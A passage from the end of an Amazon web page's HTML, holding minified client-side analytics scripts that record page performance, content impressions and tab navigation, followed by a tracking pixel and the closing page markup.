r=(e=e||{}).producerId,n=e.logger,o={},t=0,i=n||c("Events",{producerId:r});if(!r&&!n)return c.error("Either a producer id or custom logger must be defined");function a(){0<Object.keys(o).length&&(i("log",{markers:o,schemaId:e.schemaId||"<ns>.Timer.1"},e.logOptions),o={}),clearTimeout(t),t=0}this.mark=function(e,r){o[e]=(void 0===r?c.time():r)-u,t=t||c.timeout(a,s)},c.once("$beforeunload",a),c.once("$beforePageTransition",a)}r&&c.register(e,{instance:function(e){return new n(e||{})}})});csa.plugin(function(t){var e="takeRecords",i="disconnect",n="function",o="removeEventListener",c="click",a=t("Metrics",{producerId:"csa"}),r=t("PageTiming"),u=t.global,f=t.timeout,m=t.on,l=u.PerformanceObserver,s=0,d=!1,v=0,h=u.performance,y=u.document,g=null,p=!1;function T(){d||(d=!0,clearTimeout(g),typeof l[e]===n&&l[e](),typeof l[i]===n&&l[i](),a("recordMetric","documentCumulativeLayoutShift",s),r("mark","cumulativeLayoutShiftLastTimestamp",Math.floor(v+h.timing.navigationStart)))}l&&h&&h.timing&&y&&(l=new l(function(t){g&&clearTimeout(g);t.getEntries().forEach(function(t){t.hadRecentInput||(s+=t.value,v<t.startTime&&(v=t.startTime))}),g=f(T,5e3)}),function(){try{l.observe({type:"layout-shift",buffered:!0}),g=f(T,5e3)}catch(t){}}(),m(y,c,function t(e){p||(p=!0,a("recordMetric","documentCumulativeLayoutShiftToFirstInput",s),y[o](c,t))}),m(y,"visibilitychange",function(){"hidden"===y.visibilityState&&T()}),t.once("$unload",T))});csa.plugin(function(e){var t,n=e.global,r=n.PerformanceObserver,c=e("Metrics",{producerId:"csa"}),o=0,i=0,a=-1,l=n.Math,f=l.max,u=l.ceil;if(r){t=new r(function(e){e.getEntries().forEach(function(e){var t=e.duration;o+=t,i+=t,a=f(t,a)})});try{t.observe({type:"longtask",buffered:!0})}catch(e){}t=new r(function(e){0<e.getEntries().length&&(i=0,a=-1)});try{t.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}e.on("$unload",g),e.on("$beforePageTransition",g)}function g(){c("recordMetric","totalBlockingTime",u(i||0)),c("recordMetric","totalBlockingTimeInclLCP",u(o||0)),c("recordMetric","maxBlockingTime",u(a||0)),i=o=0,a=-1}});csa.plugin(function(r){var e="CacheDetection",o="csa-ctoken-",c=r.store,t=r.deleteStored,n=r.config,a=n[e+".RequestID"],i=n[e+".Callback"],s=n[e+".CDNCacheFix"],u=r.global,d=u.document||{},f=u.Date,l=r("Events"),p=r("Events",{producerId:"csa"});function v(e){try{var c=d.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return c&&c[2].trim()}catch(e){}}!function(){var e=function(){var e=v("cdn-rid");if(e)return{r:e,s:"cdn"}}()||function(){if(r.store(o+a))return{r:r.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}()||{},c=e.r,n=e.s;if(!!c){var t=v("session-id");!function(e,c,n,t){l("setEntity",{page:{pageSource:"cache",requestId:e,cacheRequestId:a,cacheSource:t},session:{id:n}})}(c,0,t,n),s&&"device"!==n||p("log",{schemaId:"<ns>.CacheImpression.1"},{ent:"all"}),i&&i(c,t,n)}}(),c(o+a,f.now()+36e5),r.once("$load",function(){var n=f.now();t(function(e,c){return 0==e.indexOf(o)&&parseInt(c)<n})})});csa.plugin(function(u){var i,t="Content",e="MutationObserver",n="addedNodes",a="querySelectorAll",s="matches",r="getAttributeNames",o="getAttribute",f="dataset",c="widget",l="producerId",d={ent:{element:1,page:["pageType","subPageType","requestId"]}},h=5,g=u.config[t+".BubbleUp.SearchDepth"]||20,m="csaC",p=m+"Id",y={},v=u.config,b=v[t+".Selectors"]||[],E=v[t+".WhitelistedAttributes"]||{href:1,class:1},I=v[t+".EnableContentEntities"],w=u.global,C=w.document||{},A=C.documentElement,U=w.HTMLElement,k={},L=[],N=function(t,e,n,i){var r=this,o=u("Events",{producerId:t||"csa"});e.type=e.type||c,r.id=e.id,r.l=o,r.e=e,r.el=n,r.rt=i,r.dlo=d,r.log=function(t,e){o("log",t,e||d)},e.id&&o("setEntity",{element:e})},O=N.prototype;function D(t){var e=(t=t||{}).element,n=t.target;return e?function(t,e){var n;n=t instanceof U?B(t)||$(e[l],t,H,u.time()):k[t.id]||_(e[l],0,t,u.time());return n}(e,t):n?S(n):u.error("No element or target argument provided.")}function S(t){var e=function(t){var e=null,n=0;for(;t&&n<g;){if(n++,T(t,p)){e=t;break}t=t.parentElement}return e}(t);return e?B(e):new N("csa",{id:null},null,u.time())}function T(t,e){if(t&&t.dataset)return t.dataset[e]}function j(t,e,n){L.push({n:n,e:t,t:e}),x()}function q(){for(var t=u.time(),e=0;0<L.length;){var n=L.shift();if(y[n.n](n.e,n.t),++e%10==0&&u.time()-t>h)break}i=0,L.length&&x()}function x(){i=i||u.raf(q)}function M(t,e,n){return{n:t,e:e,t:n}}function $(t,e,n,i){var r=u.UUID(),o={id:r},c=S(e);return e[f][p]=r,n(o,e),c.id&&(o.parentId=c.id),_(t,e,o,i)}function _(t,e,n,i){I&&(n.schemaId="<ns>.ContentEntity.2"),n.id=n.id||u.UUID();var r=new N(t,n,e,i);return I&&r.log({schemaId:"<ns>.ContentRender.1",timestamp:i}),u.emit("$content.register",r),k[n.id]=r}function B(t){return k[(t[f]||{})[p]]}function H(t,e){r in e&&(function(n,i){Object.keys(n[f]).forEach(function(t){if(!t.indexOf(m)&&m.length<t.length){var e=function(t){return(t[0]||"").toLowerCase()+t.slice(1)}(t.slice(m.length));i[e]=n[f][t]}})}(e,t),function(e,n){(e[r]()||[]).forEach(function(t){t in E&&(n[t]=e[o](t))})}(e,t))}A&&C[a]&&w[e]&&(b.push({selector:"*[data-csa-c-type]",entity:H}),b.push({selector:".celwidget",entity:function(t,e){H(t,e),t.slotId=t.slotId||e[o]("cel_widget_id")||e.id,t.type=t.type||c}}),y[1]=function(t,e){t.forEach(function(t){t[n]&&t[n].constructor&&"NodeList"===t[n].constructor.name&&Array.prototype.forEach.call(t[n],function(t){L.unshift(M(2,t,e))})})},y[2]=function(o,c){a in o&&s in o&&b.forEach(function(t){for(var e=t.selector,n=o[s](e),i=o[a](e),r=i.length-1;0<=r;r--)L.unshift(M(3,{e:i[r],s:t},c));n&&L.unshift(M(3,{e:o,s:t},c))})},y[3]=function(t,e){var n=t.e;B(n)||$("csa",n,t.s.entity,e)},y[4]=function(){u.register(t,{instance:D})},new w[e](function(t){j(t,u.time(),1)}).observe(A,{childList:!0,subtree:!0}),j(A,u.time(),2),j(null,u.time(),4),u.on("$content.export",function(e){Object.keys(e).forEach(function(t){O[t]=e[t]})}))});csa.plugin(function(n){var i,t="ContentImpressions",e="KillSwitch.",o="IntersectionObserver",r="getAttribute",s="dataset",c="intersectionRatio",a="csaCId",m=1e3,l=n.global,f=n.config,u=f[e+t],g=f[e+t+".ContentViews"],v=((l.performance||{}).timing||{}).navigationStart||n.time(),d={};function h(t){t&&(t.v=1,function(t){t.vt=n.time(),t.el.log({schemaId:"<ns>.ContentView.3",timeToViewed:t.vt-t.el.rt,pageFirstPaintToElementViewed:t.vt-v})}(t))}function I(t){t&&!t.it&&(t.i=n.time()-t.is>m,function(t){t.it=n.time(),t.el.log({schemaId:"<ns>.ContentImpressed.2",timeToImpressed:t.it-t.el.rt,pageFirstPaintToElementImpressed:t.it-v})}(t))}!u&&l[o]&&(i=new l[o](function(t){t.forEach(function(t){var e=function(t){if(t&&t[r])return d[t[s][a]]}(t.target);if(e){var i=t.intersectionRect;t.isIntersecting&&0<i.width&&0<i.height&&(g||e.v||h(e),.5<=t[c]&&!e.is&&(e.is=n.time(),e.timer=n.timeout(function(){I(e)},m))),t[c]<.5&&!e.it&&e.timer&&(l.clearTimeout(e.timer),e.is=0,e.timer=0)}})},{threshold:[0,.5]}),n.on("$content.register",function(t){var e=t.el;e&&(d[t.id]={el:t,v:0,i:0,is:0,vt:0,it:0},i.observe(e))}))});csa.plugin(function(e){e.config["KillSwitch.ContentLatency"]||e.emit("$content.export",{mark:function(t,n){var o=this;o.t||(o.t=e("Timers",{logger:o.l,schemaId:"<ns>.ContentLatency.1",logOptions:o.dlo})),o.t("mark",t,n)}})});csa.plugin(function(d){var t,i="normal",s="reload",n="history",o="new-tab",e="ajax",a=1,r=2,c="lastActive",u="lastInteraction",l="used",f="csa-tabbed-browsing",p="visibilityState",g={"back-memory-cache":1,"tab-switch":1,"history-navigation-page-cache":1},v="<ns>.TabbedBrowsing.2",b="visible",m=d.global,y=d("Events",{producerId:"csa"}),I=m.location||{},h=m.document,T=m.JSON,w=((m.performance||{}).navigation||{}).type,z=d.store,P=d.on,S=d.storageSupport(),k=!1,x={},A={},C={},O={},$=!1,j=!1,q=!1;function B(i){try{return T.parse(z(f,void 0,{session:i})||"{}")||{}}catch(i){d.error('Could not parse storage value for key "'+f+'": '+i)}return{}}function E(i,t){z(f,T.stringify(t||{}),{session:i})}function J(i){var t=A.tid||i.id,n=x[c]||{};n.tid===t&&(n.pid=i.id),O={pid:i.id,tid:t,lastInteraction:A[u]||{},initialized:!0},C={lastActive:n,lastInteraction:x[u]||{},time:d.time()}}function N(i){var t=i===o,n=h.referrer,e=!(n&&n.length)||!~n.indexOf(I.origin||""),a=t&&e,r={type:i,toTabId:O.tid,toPageId:O.pid,transitTime:d.time()-x.time||null};a||function(i,t,n){var e=i===s,a=t?x[c]||{}:A,r=x[u]||{},d=A[u]||{},o=t?r:d;n.fromTabId=a.tid,n.fromPageId=a.pid,e||!o.id||o[l]||(n.interactionId=o.id||null,r.id===o.id&&(r[l]=!0),d.id===o.id&&(d[l]=!0))}(i,t,r),y("log",{navigation:r,schemaId:v},{ent:{page:["pageType","subPageType","requestId"]}})}function D(i){q=function(i){return i&&i in g}(i.transitionType),function(){x=B(!1),A=B(!0);var i=x[u],t=A[u],n=!1,e=!1;i&&t&&i.id===t.id&&i[l]!==t[l]&&(n=!i[l],e=!t[l],t[l]=i[l]=!0,n&&E(!1,x),e&&E(!0,A))}(),J(i),$=!0,function(i){var t,n;t=G(),n=H(),(t||n)&&J(i)}(i)}function F(){k&&!q?N(e):(k=!0,N(w===r||q?n:w===a?A.initialized?s:o:A.initialized?i:o))}function G(){return!(!$||!t)&&(A[u]={id:t.messageId,used:!(x[u]={id:t.messageId,used:!1})},!(t=null))}function H(){var i=!1;if(j=h[p]===b,$){var t=x[c]||{};i=function(i,t,n){var e=!1,a=i[c];return j?a&&a.tid===O.tid&&a[b]&&a.pid===n||(i[c]={visible:!0,pid:n,tid:t},e=!0):a&&a.tid===O.tid&&a[b]&&(e=!(a[b]=!1)),e}(x,A.tid||t.tid||O.tid,A.pid||t.pid||O.pid)}return i}S.local&&S.session&&T&&h&&p in h&&(P("$pageChange",function(i){D(i),F(),E(!1,C),E(!0,O),A=O,x=C},{buffered:1}),P("$content.interaction",function(i){t=i,G()&&(E(!1,x),E(!0,A))}),P(h,"visibilitychange",function(){H()&&E(!1,x)},{capture:!1,passive:!0}))});csa.plugin(function(c){var e=c("Metrics",{producerId:"csa"});c.on(c.global,"pageshow",function(c){c&&c.persisted&&e("recordMetric","bfCache",1)})});


}
/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:139-6209373-4758101:9BH15D7TY9EC4M7ZAWTN$uedata=s:%2Fuedata%2Fuedata%3Fnoscript%26id%3D9BH15D7TY9EC4M7ZAWTN:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 45068)</script></div><div id="a-white"></div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>